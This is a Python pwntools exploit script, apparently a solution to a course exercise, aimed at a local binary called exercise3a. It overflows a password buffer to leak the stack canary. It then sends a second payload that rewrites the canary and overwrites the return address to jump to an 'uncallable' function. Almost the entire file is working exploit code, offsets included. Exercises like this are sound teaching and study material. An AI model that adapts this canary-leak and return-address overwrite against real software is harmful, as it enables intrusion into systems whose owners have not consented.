#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3a'
#exe = './exercise3a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

ca_leak = b'A' * 139
r = start()


# solution: I looked into the compiled binary file in IDA
# rbp - 0A0H, rbp - 14H => A0-14 = 8C = 140, with a "\n" => offset 139 "A"
# 14H + 4H
# sent msg two times for attack canary
r.recvuntil(b'password:\n')
r.sendline(ca_leak)
r.recvuntil(b"Well of course ")
ca_back = r.recvuntil(b' is not the password')

canary = ca_back[:-20][140:]

u_addr = ELF(exe).symbols['uncallable']
shellcode = b'A'*140 + canary + b'B'*24 + p64(u_addr)

r.recvuntil(b'password:\n')
r.sendline(shellcode)
print(r.recvall())
